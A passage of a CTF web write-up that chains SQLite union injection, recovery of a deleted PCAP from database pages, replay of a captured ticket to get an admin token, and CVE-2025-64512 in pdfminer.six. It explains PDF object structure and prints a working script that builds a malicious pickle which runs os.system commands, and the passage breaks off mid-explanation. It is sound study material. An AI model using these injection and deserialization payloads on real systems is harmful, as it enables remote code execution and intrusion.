---
title: "CTFWEB 199.193.127.177:9000"
description: "A Web CTF writeup chaining SQLite injection, PDF parsing, and rsync argument injection."
publishDate: "2026-07-31T21:43:23"
tags:
  - "ctf"
  - "web"
heroImage:
  src: ../../blog/ctfweb-sqlite-pdf-rce/woke-up-at-night.jpg
  color: "#9A8983"
  alt: CTFWEB 199.193.127.177:9000
language: 'en'
draft: false
---

A Web challenge made by a senior teammate. The login stage seemed inspired by Ghost Zero from the recent D^3CTF. It was a fun challenge, and I learned a lot along the way.

## SQLite Injection

The site opens with a login form.

Trying `1'` as the credentials returns `near "d432e1884c5cc00b34c5020177c53036ba0b8aa80d7ec08d8af4cf9e1205215d": syntax error`, suggesting SQL injection.

Testing shows that `--` can comment out the rest of the statement.

Stacked queries are blocked.

Union-based queries work.

There are three columns, all reflected in the response.

The backend logic appears similar to:

```sql
SELECT id, username, hash
FROM users
WHERE username = '<username>'
  AND hash = '<password_hash>'
```

The database is `sqlite`, version `3.40.1`.

I also retrieve several tables:

```sql
1' UNION SELECT type,name,sql FROM sqlite_master--
```

```http
HTTP/1.1 401 UNAUTHORIZED
Server: gunicorn
Date: Wed, 29 Jul 2026 12:45:52 GMT
Connection: close
Content-Type: application/json
Content-Length: 566

{"audit":[{"hash":"CREATE TABLE User (id INTEGER PRIMARY KEY, username TEXT NOT NULL, hash TEXT NOT NULL)","id":"table","username":"User"},{"hash":"CREATE TABLE knowledge_base (id INTEGER PRIMARY KEY, title TEXT NOT NULL, summary TEXT NOT NULL)","id":"table","username":"knowledge_base"},{"hash":"CREATE TABLE \"logs??\" (id INTEGER PRIMARY KEY, \"text???\" TEXT NOT NULL)","id":"table","username":"logs??"},{"hash":"CREATE TABLE \"q_8f3c1a72d90e4b65\" (id INTEGER PRIMARY KEY, \"r4\" TEXT NOT NULL)","id":"table","username":"q_8f3c1a72d90e4b65"}],"error":"denied"}
```

The `User` table:

```sql
1' UNION SELECT * FROM USER--
```

```http
HTTP/1.1 401 UNAUTHORIZED
Server: gunicorn
Date: Wed, 29 Jul 2026 13:14:27 GMT
Connection: close
Content-Type: application/json
Content-Length: 233

{"audit":[{"hash":"84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec","id":1,"username":"guest"},{"hash":"44b9cd203435cab8059b6cc6c86ece838535cf8a5845083b19b4398652772614","id":2,"username":"admin"}],"error":"denied"}
```

The `knowledge_base` table:

```sql
1' UNION SELECT id,title,summary FROM knowledge_base--
```

```http
HTTP/1.1 401 UNAUTHORIZED
Server: gunicorn
Date: Wed, 29 Jul 2026 12:55:31 GMT
Connection: close
Content-Type: application/json
Content-Length: 956

{"audit":[{"hash":"Episode index, staff notes, and release windows.","id":1,"username":"Silent Spiral"},{"hash":"Mirror metadata for a restored art-school batch.","id":2,"username":"Blue Period Archive"},{"hash":"Station cuts, preview frames, and translation notes.","id":3,"username":"Metro Bloom"},{"hash":"Syndicated late-night slot with regional edits.","id":4,"username":"Kisaragi Relay"},{"hash":"Compression report for a twelve-part remaster.","id":5,"username":"Nocturne Grid"},{"hash":"A continuity map for cour one and cour two.","id":6,"username":"Kyoto Loop"},{"hash":"Scans, subs, and renderer compatibility notes.","id":7,"username":"Paper Siren"},{"hash":"Broadcast captures for missing bumpers.","id":8,"username":"Signal Garden"},{"hash":"Source provenance and scene timing corrections.","id":9,"username":"Neon Weather"},{"hash":"Catalogued inserts and clean opening variants.","id":10,"username":"After School Atlas"}],"error":"denied"}
```

The `q_8f3c1a72d90e4b65` table:

```sql
1' UNION SELECT id,r4,3 FROM q_8f3c1a72d90e4b65--
```

```http
HTTP/1.1 401 UNAUTHORIZED
Server: gunicorn
Date: Wed, 29 Jul 2026 12:50:07 GMT
Connection: close
Content-Type: application/json
Content-Length: 389

{"audit":[{"hash":"3","id":1,"username":"/test/7f9c18a2e44d/5d0185499f64d3116843ddcb3dd16344.pcap"},{"hash":"3","id":2,"username":"/test/7f9c18a2e44d/04f9654471407af9db118e1cb7333bba.pcap"},{"hash":"3","id":3,"username":"/test/7f9c18a2e44d/73cfa9f8eafad4b574970ae9ced11c67.pcap"},{"hash":"3","id":4,"username":"/test/7f9c18a2e44d/d418e1a02f2f607a3d0f23a3cc1b9091.pcap"}],"error":"denied"}
```

The four files listed in the last table are downloadable, but unfamiliar to me.
They seem related to traffic analysis...
A type of challenge I had not worked on before.

## Recovering a Deleted PCAP

A hint points me toward SQLite virtual tables: deleted records may still be recoverable under the right conditions.

SQLite provides an optional official virtual-table extension, **`sqlite_dbpage`**, for inspecting underlying database pages.

It exposes **raw database pages as binary data**, rather than only the logical rows visible through ordinary table queries.

Its basic schema is equivalent to:

```sql
CREATE TABLE sqlite_dbpage(
  pgno INTEGER PRIMARY KEY, /* 页码 (Page number) */
  data BLOB                 /* 该页对应的原始二进制数据 (Raw page data) */
);
```

Since it reads physical page bytes, it may expose remnants of deleted records **if those bytes have not been erased or overwritten**. Availability also depends on how SQLite was built.

That suggests extracting `data` as hex and looking for remnants. First, I check the page count.

There are five pages, including traces of an additional deleted record.

```sql
1' UNION SELECT 1,2,pgno FROM sqlite_dbpage-- 
```

```http
HTTP/1.1 401 UNAUTHORIZED
Server: gunicorn
Date: Wed, 29 Jul 2026 16:11:58 GMT
Connection: close
Content-Type: application/json
Content-Length: 204

{"audit":[{"hash":"1","id":1,"username":"2"},{"hash":"2","id":1,"username":"2"},{"hash":"3","id":1,"username":"2"},{"hash":"4","id":1,"username":"2"},{"hash":"5","id":1,"username":"2"}],"error":"denied"}
```

Using `1' UNION SELECT 1,pgno,hex(data) FROM sqlite_dbpage` and CyberChef, I find the deleted path `/test/7f9c18a2e44d/fe291443882d55af94bff1f9cddffb73.pcap`:

```text
OCAPTURE_RECEIPT:{"batch":"cap-2024-11-ops","storagePath":"/app/data/test/7f9c18a2e44d/fe291443882d55af94bff1f9cddffb73.pcap","downloadPath":"/test/7f9c18a2e44d/fe291443882d55af94bff1f9cddffb73.pcap","bytes":18231,"sha256":"8f3a34bb0b9bef7ed0a1466762a3c29443b298b42095215f09b19e98d289eda1"}
}/test/7f9c18a2e44d/d418e1a02f2f607a3d0f23a3cc1b9091.pcap
}/test/7f9c18a2e44d/73cfa9f8eafad4b574970ae9ced11c67.pcap
}/test/7f9c18a2e44d/04f9654471407af9db118e1cb7333bba.pcap
}/test/7f9c18a2e44d/5d0185499f64d3116843ddcb3dd16344.pcap
```

After downloading it, I inspect the HTTP traffic in Wireshark:

```text
第一步是进行健康检查
GET /health HTTP/1.1
Host: legacy-api.internal:8080
User-Agent: legacy-capture/2.1


HTTP/1.1 200 OK
Content-Type: application/json
Server: legacy-api
Content-Length: 34

{"ok":true,"service":"legacy-api"}

第二步是获取exchangeTicket
POST /ddddddtestStat HTTP/1.1
Authorization: Bearer REDACTED-LEGACY-USER-JWT
Content-Type: application/json
X-Legacy-Mode: plaintext-test
X-Debug-Capture: pre-encryption
Host: legacy-api.internal:8080
User-Agent: legacy-capture/2.1
Content-Length: 72

{"principal":"ops-root","mode":"bootstrap","credentialType":"temporary"}

HTTP/1.1 200 OK
Content-Type: application/json
X-Capture-Stage: pre-encryption
Server: legacy-api
Content-Length: 137

{"exchangeTicket":"ltkt_X-Nx9HoMKuJGwDYYSeCnLGZASTdkgObaqK-VXoCZ","exchangeAudience":"frontend-admin","expiresAt":"2038-01-19T03:14:07Z"}

第三步是拿ticket兑换admin的accessToken
POST /api/auth/exchange HTTP/1.1
Content-Type: application/json
X-Exchange-Source: legacy-capture
Host: mirror-edge.internal:8080
User-Agent: legacy-capture/2.1
Content-Length: 73

{"ticket":"ltkt_X-Nx9HoMKuJGwDYYSeCnLGZASTdkgObaqK-VXoCZ","want":"admin"}

HTTP/1.1 200 OK
Content-Type: application/json
Server: legacy-api
Content-Length: 88

{"role":"admin","accessToken":"redacted-at-capture","session":"browser","next":"/admin"}

第四步是提交一封已加密的信封
POST /v3/envelope/ingest HTTP/1.1
Content-Type: application/x-legacy-envelope
X-Envelope-Stage: sealed
Host: capture-gw.internal:8443
User-Agent: legacy-capture/2.1
Content-Length: 1019

{"kid":"env-v3","label":"archive-noise","nonce":"076b2bb4689131a87c99bb68","ct":"qvEh3F6ciiTQTqUBitItGcWfWI2X3IBcRFKf2id8TcqTcg/iwgvFyiDvVLTCCukVCHArnbKTo0N3tAFfm06pUYxMgEKJwZju4LxCfw4I+oWHSbMVIxr2xB/az/1VH7mNhxR7eSnkxj/uHY9rhe28NSlZP+a5IAxw62YMu+cedc11YxaSyDyCVIKlqRVlmoAvYtgKjHKlBXMxJZrxsMG7qGibEQ/yh3/9epaveqmQMrspYykWk+RAa11Q/PAEnpFqLYinNIsZLZinpNeV7ykEm3siEgkk98+y0TLmfMFkofRG5jUZ2FNDd1cA025bu6sPuzmLT3/gccn20s+4FcDY2/BfFVSN8no8+9xOwj09EveHf4fIODQ2dDaM8qrnllMwjQE0sx7BiR+Lq5iu/52zJbzD26taKwoR09srOz0Tq8+asVvPH8oKHdtHdrharWtkobnet+kN8Ghgup7wpZNLSUGEsJw6vIA00i6MjaYSgGVucLJvBbfS/lyx20DCwcZ3b4vjKLIMTN6XnQafzF1QeS5nPEj/w6bXKO0mikUg3gdsW/OcdQDkGBDmoHxnYRJ3gge5CDXGrZiiiIUQfJfMvK4sbzVNQhvo8LOQa5vsnRHZSh6d4+cn6+seSSx7KeMQK6rL0f6te4bOuwFseClBaIDnVm251Q5/a5SzI7rjn5vg5Lk3FxCMmBd9IJX3cbG16dIOJ/jiZHWE5OqL3Ro8Iy3+V7gcY/hSXWfBOhYFcfXvFiBsISQsN5EoNC3Q36LDqxHt8mCm61e5aGWGr/PrPwy4tHFr/rvNCJ9XVWtYXpQma0xzqWX+WIrhBvtiwYQrY9fiVWWDGSnk4+jWWRIN+JVXT2sWf7YYakaECKE4FmAJREeeUUEHldx1FjI1oRYWUIg2fJUi4JDtmMT4N2zctT5snQmUWn5WaefvIA=="}

HTTP/1.1 204 No Content
Server: legacy-api
Content-Length: 0
```

The second and third steps reveal the flow for obtaining admin access.

## Exchanging the Ticket for an accessToken

`/ddddddtestStat` returns 404, so I try the ticket already recorded in the capture:

```http
POST /api/auth/exchange HTTP/1.1
Content-Type: application/json
X-Exchange-Source: legacy-capture
Host: 199.193.127.177:9000
User-Agent: legacy-capture/2.1
Content-Length: 73

{"ticket":"ltkt_X-Nx9HoMKuJGwDYYSeCnLGZASTdkgObaqK-VXoCZ","want":"admin"}

HTTP/1.1 200 OK
Server: gunicorn
Date: Wed, 29 Jul 2026 16:42:50 GMT
Connection: close
Content-Type: application/json
Content-Length: 245

{"accessToken":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImF1ZCI6InBkZi1yZW5kZXJlciIsImlhdCI6MTc4NTM0MzM3MCwiZXhwIjoxNzg1MzY0OTcwfQ.NQbgH16UZsjoiG-zQeCNGhzcGlGKQDmKzA-5EVkhNPA","next":"/admin","role":"admin"}
```

The exchange returns an accessToken. Setting the HackBar header to `Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImF1ZCI6InBkZi1yZW5kZXJlciIsImlhdCI6MTc4NTM0MzM3MCwiZXhwIjoxNzg1MzY0OTcwfQ.NQbgH16UZsjoiG-zQeCNGhzcGlGKQDmKzA-5EVkhNPA` opens the admin panel, a PDF renderer. This also introduced me to the `Authorization: Bearer` scheme defined in RFC 6750. Many token-based APIs use it, although JWT does not itself require that transport; cookies and custom headers are other possibilities. The earlier capture already showed the expected scheme: `POST /ddddddtestStat HTTP/1.1` with `Authorization: Bearer REDACTED-LEGACY-USER-JWT`.

`/admin`:

```html
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Renderer</title>
    <link rel="stylesheet" href="/static/main.css">
  </head>
  <body>
    <main class="admin-layout">
      <section class="panel render-panel">
        <div class="brand">Renderer</div>
        <form id="pdf-form" class="form">
          <label>
            Document
            <input id="pdf" name="pdf" type="file" accept="application/pdf,.pdf">
          </label>
          <button type="submit">Convert</button>
        </form>
      </section>
      <section class="panel output-panel">
        <pre id="output"></pre>
      </section>
    </main>
    <script src="/static/admin.js"></script>
  </body>
</html>
```

`/static/admin.js`:

```javascript
const form = document.querySelector("#pdf-form");
const output = document.querySelector("#output");

form.addEventListener("submit", async (event) => {
  event.preventDefault();
  output.textContent = "";
  const pdf = document.querySelector("#pdf").files[0];
  const body = new FormData();
  body.append("pdf", pdf);
  const res = await fetch("/api/pdf/convert", {
    method: "POST",
    body,
  });
  const data = await res.json();
  output.textContent = JSON.stringify(data, null, 2);
});
```

The script listens for the admin page's PDF-upload form, sends the selected file as the `pdf` field to `/api/pdf/convert`, and displays the returned JSON.

The raw HTTP request has this form:

```http
POST /api/pdf/convert HTTP/1.1
Content-Type: multipart/form-data; boundary=----xxxWebKitFormBoundaryY5EMBpz4pba8Mtbm

------WebKitFormBoundaryY5EMBpz4pba8Mtbm
Content-Disposition: form-data; name="pdf"; filename="test.pdf"
Content-Type: application/pdf

%PDF-1.3
...<这里是PDF文件的原始二进制内容>
%%EOF
------WebKitFormBoundaryY5EMBpz4pba8Mtbm--
```

My attempt:

```http
POST /api/pdf/convert HTTP/1.1
Host: 199.193.127.177:9000
Authorization:Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImF1ZCI6InBkZi1yZW5kZXJlciIsImlhdCI6MTc4NTQ3OTY5NiwiZXhwIjoxNzg1NTAxMjk2fQ.I7wKwZgeTu-B37LtPeEozbUHXwBZ5Wj0GTdC_Tvq1mg
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryY5EMBpz4pba8Mtbm
Accept: */*
Origin: http://199.193.127.177:9000
Referer: http://199.193.127.177:9000/admin
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: keep-alive
Content-Length: 189

------WebKitFormBoundaryY5EMBpz4pba8Mtbm
Content-Disposition: form-data; name="pdf"; filename="sample.pdf"
Content-Type: application/pdf



------WebKitFormBoundaryY5EMBpz4pba8Mtbm--
```

Response:

```http
HTTP/1.1 200 OK
Server: gunicorn
Date: Fri, 31 Jul 2026 06:54:43 GMT
Connection: close
Content-Type: application/json
Content-Length: 919

{"job":"23b7196c5fb44b56bfaa93bcf4a0698c","returncode":1,"stderr":"Traceback (most recent call last):\n  File \"/app/app/pdf_worker.py\", line 12, in <module>\n    main(sys.argv[1], sys.argv[2])\n  File \"/app/app/legacy_pdf.py\", line 141, in main\n    print(json.dumps(convert(Path(pdf), Path(job)), separators=(\",\", \":\")))\n                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/app/app/legacy_pdf.py\", line 115, in convert\n    raise ValueError(\"not a pdf\")\nValueError: not a pdf\n","stdout":"{\"error\":\"not a pdf\",\"trace\":\"Traceback (most recent call last):\\n  File \\\"/app/app/pdf_worker.py\\\", line 12, in <module>\\n    main(sys.argv[1], sys.argv[2])\\n  File \\\"/app/app/legacy_pdf.py\\\", line 141, in main\\n    print(json.dumps(convert(Path(pdf), Path(job)), separators=(\\\",\\\", \\\":\\\")))\\n                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\\nValueError: not a pdf\\n\"}\n"}
```

Authentication succeeds and reaches the rendering backend, but my upload is not a PDF, producing `ValueError: not a pdf`. The traceback also exposes `/app/app/pdf_worker.py` and `/app/app/legacy_pdf.py`.

Uploading a valid PDF:

```text
------WebKitFormBoundaryY5EMBpz4pba8Mtbm
Content-Disposition: form-data; name="pdf"; filename="sample.pdf"
Content-Type: application/pdf
%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] >>
endobj
trailer
<< /Root 1 0 R >>
%%EOF
------WebKitFormBoundaryY5EMBpz4pba8Mtbm--
```

```json
{"job":"c8fea93055f1478c9ffd1979cd171658","returncode":0,"stderr":"","stdout":"{\"embedded\":[],\"encodings\":[],\"loaded\":[],\"missing\":[],\"pages\":1}\n"}
```

My interpretation of the returned fields:

```text
{
  "embedded": [],            ->内嵌的东西
  "encodings": [],        ->编码情况
  "loaded": [],                ->加载情况
  "missing": [],            ->缺失的东西
  "pages": 1                    ->pdf页数
}
```

At this point, I had no idea how to use any of it. Time to ask for another hint.

## Understanding PDF

The next hint is CVE-2025-64512 and [From the PDF Object Tree to RCE](https://www.ymsora.com/posts/pdf1/). This was new territory for me, so I took the opportunity to learn the PDF basics:

A PDF is a document built from objects. A reader starts at an entry object and follows references to pages, fonts, images, content streams, and other objects.

### 1. The Broad File Structure

A conventional PDF can be divided into four broad parts:

```text
%PDF-1.7

1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj

2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj

3 0 obj
<< /Type /Page /Parent 2 0 R /Contents 4 0 R >>
endobj

4 0 obj
<< /Length 44 >>
stream
BT /F1 24 Tf 100 700 Td (Hello PDF) Tj ET
endstream
endobj

xref
...
trailer
<< /Root 1 0 R >>
%%EOF
```

Their roles:

| Part | Purpose |
| --- | --- |
| `%PDF-1.7` | Header identifying the PDF version |
| `obj ... endobj` | Individual indirect objects |
| `stream ... endstream` | Larger data such as page content, images, or font data |
| `xref` | Cross-reference information locating objects |
| `trailer` | Dictionary identifying document-level information and the entry point |
| `/Root` | Reference to the document catalog |

### 2. What Is a PDF Object?

The core concept is the **object**.

For example:

```text
1 0 obj
<<
  /Type /Catalog
  /Pages 2 0 R
>>
endobj
```

`1 0 obj` means:

```text
对象编号：1
版本号：0
对象内容：一个字典
```

`2 0 R` refers to another object:

```text
引用 2 号对象，第 0 代版本
```

`/Pages 2 0 R` means the `/Pages` entry references object `2 0 obj` rather than embedding the page tree directly.

### 3. Basic PDF Data Types

Common forms include:

| Type | Example | Meaning |
| --- | --- | --- |
| Boolean | `true`, `false` | Boolean value |
| Number | `123`, `3.14` | Numeric value |
| Name | `/Catalog`, `/Page` | A name, often used as a key or enumerated value |
| String | `(hello)` | Literal string |
| Hex string | `<48656c6c6f>` | Hexadecimal string |
| Array | `[1 2 3 0 R]` | Ordered values |
| Dictionary | `<< /Type /Page >>` | Key–value mapping |
| Stream | `stream ... endstream` | Binary or textual data with an associated dictionary |
| Indirect reference | `5 0 R` | Reference to another object |

Three particularly important building blocks are:

```text
字典 Dictionary
引用 Reference
流 Stream
```

Together they form much of the document's object structure.

### 4. The Object Tree

A simplified structure:

```text
Catalog
  -> Pages
      -> Page
          -> Contents
          -> Resources
              -> Font
              -> XObject
              -> ColorSpace
```

The diagram makes it easier to follow:

![PDF object tree](../../blog/ctfweb-sqlite-pdf-rce/images/1-1.png)

This describes **references**, not physical file order. Objects can appear elsewhere in the file as long as the cross-reference information locates them.

### 5. Catalog: the Root of the Document

The catalog is the document's entry object.

```text
1 0 obj
<<
  /Type /Catalog
  /Pages 2 0 R
>>
endobj
```

`/Type /Catalog` identifies its role.

`/Pages 2 0 R` points to the page tree.

A parser normally finds `/Root` in the trailer information:

```text
trailer
<<
  /Root 1 0 R
>>
```

It follows that reference to `1 0 obj`, then follows `/Pages`.

### 6. Pages and Page

`/Pages` denotes a page-tree node; `/Page` denotes a leaf page.

```text
2 0 obj
<<
  /Type /Pages
  /Kids [3 0 R]
  /Count 1
>>
endobj
```

Meaning:

```text
这是一个页面树节点
它有 1 个子页面
子页面是 3 0 obj
```

A page object:

```text
3 0 obj
<<
  /Type /Page
  /Parent 2 0 R
  /MediaBox [0 0 595 842]
  /Contents 4 0 R
  /Resources 5 0 R
>>
endobj
```

Important entries:

| Entry | Meaning |
| --- | --- |
| `/Parent` | Parent page-tree node |
| `/MediaBox` | Page boundaries |
| `/Contents` | Page drawing instructions |
| `/Resources` | Fonts, images, and other page resources |

### 7. Contents: the Page Content Stream

The visible page content is generally described by the streams referenced by `/Contents`.

```text
4 0 obj
<< /Length 44 >>
stream
BT
/F1 24 Tf
100 700 Td
(Hello PDF) Tj
ET
endstream
endobj
```

These are PDF drawing instructions, not HTML.

A brief explanation:

| Instruction | Meaning |
| --- | --- |
| `BT` | Begin a text object |
| `/F1 24 Tf` | Select font F1 at size 24 |
| `100 700 Td` | Move the text position |
| `(Hello PDF) Tj` | Show the string |
| `ET` | End the text object |

A PDF page is a sequence of drawing operations rather than simply a block of text.

### 8. Resources: the Resource Dictionary

When the content says `/F1 24 Tf`, `/Resources` identifies the font named `/F1`.

```text
5 0 obj
<<
  /Font <<
    /F1 6 0 R
  >>
>>
endobj
```

Meaning:

```text
页面资源里有一个字体资源
名字叫 /F1
真正的字体对象是 6 0 obj
```

The font object might be:

```text
6 0 obj
<<
  /Type /Font
  /Subtype /Type1
  /BaseFont /Helvetica
>>
endobj
```

This specifies ordinary Helvetica.

### 9. Why Fonts Matter to This Vulnerability

PDF text is not always stored as straightforward Unicode characters.

It often uses encoded character codes, such as:

```text
0x01 0x02 0x03
```

Mapping those codes to glyphs or Unicode requires font-related mapping information. **CMaps** are part of that process.

A simplified view:

```text
PDF 内部字符编码 -> 真正 Unicode 字符
```

For example:

```text
<0001> -> U+4F60  你
<0002> -> U+597D  好
```

Text extraction therefore requires parsing font and mapping information.

### 10. Type0 Fonts and CMaps

Composite fonts, particularly for CJK text, commonly use `/Subtype /Type0`.

Illustration:

```text
7 0 obj
<<
  /Type /Font
  /Subtype /Type0
  /BaseFont /SomeFont
  /Encoding /Identity-H
  /DescendantFonts [8 0 R]
>>
endobj
```

`/Encoding /Identity-H` names a predefined CMap.

Normally, that selects the built-in `Identity-H` mapping.

The issue in CVE-2025-64512 is that **a crafted encoding name could lead vulnerable pdfminer.six versions to load an attacker-controlled CMap pickle file**.

### 11. Why pdfminer.six Loads Pickle Data

The vulnerable implementation stores certain CMap data as `.pickle.gz` files for loading by the parser.

The rough flow:

```text
遇到 /Encoding /Identity-H
    -> CMapDB.get_cmap("Identity-H")
    -> 找 Identity-H.pickle.gz
    -> gzip 解压
    -> pickle.loads()
    -> 得到 CMap 数据
```

`pickle.loads()` is unsafe for untrusted input: reconstructing an object can invoke code rather than merely decode inert data.

### 12. The Core of CVE-2025-64512

The chain can be summarized as:

```text
PDF 控制 /Encoding 名称
    -> pdfminer.six 把它当作 CMap 文件名
    -> 拼接成 .pickle.gz 路径
    -> 读取恶意 gzip pickle
    -> pickle.loads() 触发代码执行
```

It is not:

```text
PDF 自己执行代码
```

Instead:

```text
解析 PDF 的 Python 库错误地信任了 PDF 影响到的文件路径和 pickle 内容
```

The attacker therefore generally needs both:

```text
1. 一个恶意 PDF，用来触发加载某个 CMap 名称
2. 一个恶意 .pickle.gz 文件，放在目标可访问的位置
```

### 13. A Worked Example

A simple ordinary PDF:

```text
%PDF-1.7

1 0 obj
<<
  /Type /Catalog
  /Pages 2 0 R
>>
endobj

2 0 obj
<<
  /Type /Pages
  /Kids [3 0 R]
  /Count 1
>>
endobj

3 0 obj
<<
  /Type /Page
  /Parent 2 0 R
  /MediaBox [0 0 595 842]
  /Resources 4 0 R
  /Contents 5 0 R
>>
endobj

4 0 obj
<<
  /Font <<
    /F1 6 0 R
  >>
>>
endobj

5 0 obj
<<
  /Length 46
>>
stream
BT /F1 24 Tf 100 700 Td (Hello PDF) Tj ET
endstream
endobj

6 0 obj
<<
  /Type /Font
  /Subtype /Type1
  /BaseFont /Helvetica
>>
endobj

xref
...
trailer
<<
  /Root 1 0 R
>>
%%EOF
```

It displays a line resembling:

```text
Hello PDF
```

Parsing is not merely reading every line in order. The parser first uses the ending information:

```text
trailer
<<
  /Root 1 0 R
>>
```

Meaning:

```text
PDF 的根对象是 1 0 obj
```

Then follows:

```text
1 0 obj
<<
  /Type /Catalog
  /Pages 2 0 R
>>
endobj
```

The catalog points to the page tree at `2 0 R`.

That reference means:

```text
引用 2 号对象，第 0 代版本
```

Next:

```text
2 0 obj
<<
  /Type /Pages
  /Kids [3 0 R]
  /Count 1
>>
endobj
```

The page-tree node tells the parser:

```text
这个 PDF 一共有 1 页
真正的页面对象是 3 0 R
```

Then the page object:

```text
3 0 obj
<<
  /Type /Page
  /Parent 2 0 R
  /MediaBox [0 0 595 842]
  /Resources 4 0 R
  /Contents 5 0 R
>>
endobj
```

Two key entries:

```text
/Resources 4 0 R
/Contents 5 0 R
```

`/Resources` describes resources such as fonts, images, and color spaces.

`/Contents` describes what to draw and where.

First, the resources:

```text
4 0 obj
<<
  /Font <<
    /F1 6 0 R
  >>
>>
endobj
```

Meaning:

```text
这一页有一个字体资源
它在页面内容流里的名字叫 /F1
真正字体对象是 6 0 R
```

The font object:

```text
6 0 obj
<<
  /Type /Font
  /Subtype /Type1
  /BaseFont /Helvetica
>>
endobj
```

Meaning:

```text
/F1 对应 Helvetica 字体
```

Then the content stream:

```text
5 0 obj
<<
  /Length 46
>>
stream
BT /F1 24 Tf 100 700 Td (Hello PDF) Tj ET
endstream
endobj
```

The stream contains drawing instructions:

```text
BT
/F1 24 Tf
100 700 Td
(Hello PDF) Tj
ET
```

Step by step:

```text
BT              Begin Text，开始写文字
/F1 24 Tf       使用 /F1 字体，字号 24
100 700 Td      把文字位置移动到 x=100, y=700
(Hello PDF) Tj  显示字符串 Hello PDF
ET              End Text，结束文字绘制
```

The resulting object structure:

![Object tree for the example PDF](../../blog/ctfweb-sqlite-pdf-rce/images/2-1.png)

Important syntax recap:

```text
1 0 obj
...
endobj
```

Declares an indirect object.

```text
2 0 R
```

Refers to an object.

```text
<< /Type /Page >>
```

Denotes a dictionary, roughly analogous to a JSON object.

```text
[3 0 R]
```

Denotes an array.

```text
stream
...
endstream
```

Denotes stream data, commonly page contents, images, compressed data, or fonts.

Now add the challenge's vulnerable path to that ordinary structure. Compare a normal font with one that sends the vulnerable parser toward the CMap loader.

#### An Ordinary Font Object

A page object might look like:

```text
3 0 obj
<<
  /Type /Page
  /Parent 2 0 R
  /MediaBox [0 0 595 842]
  /Resources 4 0 R
  /Contents 5 0 R
>>
endobj
```

Its resources name the font:

```text
4 0 obj
<<
  /Font <<
    /F1 6 0 R
  >>
>>
endobj
```

The ordinary font:

```text
6 0 obj
<<
  /Type /Font
  /Subtype /Type1
  /BaseFont /Helvetica
>>
endobj
```

This simple font does not use the Type0 CMap path at issue. The relevant combination is a **Type0 font and its encoding CMap**.

#### The Crafted Font Object

The crafted resource points `/F1` to a Type0 font:

```text
6 0 obj
<<
  /Type /Font
  /Subtype /Type0
  /BaseFont /DemoFont
  /Encoding /Identity-H
  /DescendantFonts [7 0 R]
>>
endobj
```

Normally:

```text
/Encoding /Identity-H
```

Selects the built-in mapping:

```text
Identity-H.pickle.gz
```

In the vulnerable case, the name is replaced with a path-like value:

```text
/Encoding /#2Ftmp#2Fdemo
```

`#2F` is a hexadecimal escape for `/` inside a PDF Name.

Thus:

```text
/#2Ftmp#2Fdemo
```

Parses to a value resembling:

```text
/tmp/demo
```

The vulnerable loader then constructs:

```text
/tmp/demo + .pickle.gz
```

Producing:

```text
/tmp/demo.pickle.gz
```

The dangerous operation follows:

```text
pdfminer.six 读取 /tmp/demo.pickle.gz
gzip 解压
pickle.loads()
```

If `demo.pickle.gz` contains attacker-controlled pickle data, deserialization can execute code.

That leaves two requirements for the challenge chain:

```text
1. 恶意 pickle.gz 如何出现在服务端
2. PDF 里的 /Encoding 路径如何指向它
```

## Applying CVE-2025-64512 in the Challenge

My senior teammate also supplied these hints:

```text
1.文章只写了怎么load没写怎么把恶意pickle打进服务器，你可以去考虑一下在只传一个pdf的情况下怎么把恶意pickle打到你要load的目录下面去
2.还有个细节就是利用路径穿越去做路径对齐，不然load不到
```

Back to the challenge.

For the first hint, **PDF supports embedded files**. The backend's `legacy_pdf.py` extracts them; the earlier JSON `embedded` field reports those attachments. A single uploaded PDF can therefore carry the pickle data and control its `/Encoding` field in this challenge. I start by preparing the attachment.

### make_pickle.py

The supplied pickle-building script:

```python
#!/usr/bin/env python3

import gzip
import pickle

#伪装数据。服务端pdfminer加载完我们的pickle后，会把它当作一个CMap模块来用，会访问CODE2CID、IS_VERTICAL等四个属性。我们给上空的合法值，服务端的后续逻辑就不会报错
CMAP_MODULE = {
    "CODE2CID": {},
    "IS_VERTICAL": False,
    "CID2UNICHR_H": {},
    "CID2UNICHR_V": {},
}

#定义构造函数，参数cmd就是要在服务器上执行的系统命令字符串
def make_pickle_gz(cmd):
    expr = f"(__import__('os').system({cmd!r}), {CMAP_MODULE!r})[1]"

    class Test:
        def __reduce__(self):    #pickle协议的钩子
            return eval, (expr,)

    return gzip.compress(pickle.dumps(Test()))

#输入命令
cmd = input("请输入cmd: ")

#以二进制写模式创建文件
with open("test.pickle.gz", "wb") as f:
    f.write(make_pickle_gz(cmd))

print("test.pickle.gz written")
```

The key is `def __reduce__(self)`. In this example, pickling records the returned `(callable, args)` reconstruction recipe. On unpickling, that means **call `callable(*args)` to reconstruct the object**.

The important distinction:

Pickle can describe how to reconstruct an object by calling a function. Here `__reduce__` supplies that recipe:

```text
反序列化时，请调用 eval(expr)
```

`expr` is built as:

```python
expr = f"(__import__('os').system({cmd!r}), {CMAP_MODULE!r})[1]"
```

For example, given:

```bash
id
```

The resulting expression resembles:

```python
